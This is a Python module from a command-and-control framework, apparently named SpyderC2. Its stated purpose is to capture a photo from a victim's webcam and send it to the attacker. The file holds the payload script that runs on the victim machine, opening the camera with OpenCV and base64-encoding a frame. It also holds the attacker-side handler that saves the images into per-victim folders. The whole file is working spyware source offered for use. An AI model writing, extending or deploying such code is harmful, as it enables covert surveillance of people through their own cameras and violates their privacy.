import sys
import os
import pathlib
import time
import base64
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Webcam(Module):
    description = 'Captures a photo from the victim webcam and sends it to the attacker.'

    @classmethod
    def module_options(cls):
        h = {
            'path': {'desc': 'Directory on the attacker machine where the image is saved. Default is shared/victim_data/<victim_id>.', 'required': False}
        }
        return h

    def __init__(self, name, utility, language, options):
        super(Webcam, self).__init__(name, self.description, utility, language, getattr(self, f"script_{language}")(options))

    def handle_task_output(self, data, options, victim_id, task_id):
        dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()), '../../shared/victim_data', victim_id)
        if not os.path.exists(dump_path):
            os.makedirs(dump_path)

        filename = f"webcam_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.png"
        file_path = os.path.join(dump_path, filename)

        if 'path' in options:
            if os.path.exists(options['path']):
                file_path = os.path.join(options['path'], filename)

        if not os.access(os.path.dirname(file_path), os.W_OK):
            dump_path = os.path.join('/tmp', 'SpyderC2', victim_id)
            if not os.path.exists(dump_path):
                os.makedirs(dump_path, exist_ok=True)
            file_path = os.path.join(dump_path, filename)

        decoded = base64.b64decode(data)
        with open(file_path, 'wb') as f:
            f.write(decoded)

        return file_path

    def script_python(self, options):
        return """def execute_command():
    import cv2
    import base64
    import tempfile
    import os

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return base64.b64encode(b'ERROR: No webcam found').decode()

    ret, frame = cap.read()
    cap.release()

    if not ret:
        return base64.b64encode(b'ERROR: Could not capture frame').decode()

    tmp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
    cv2.imwrite(tmp.name, frame)
    tmp.close()

    with open(tmp.name, 'rb') as f:
        encoded = base64.b64encode(f.read()).decode()
    os.remove(tmp.name)
    return encoded
"""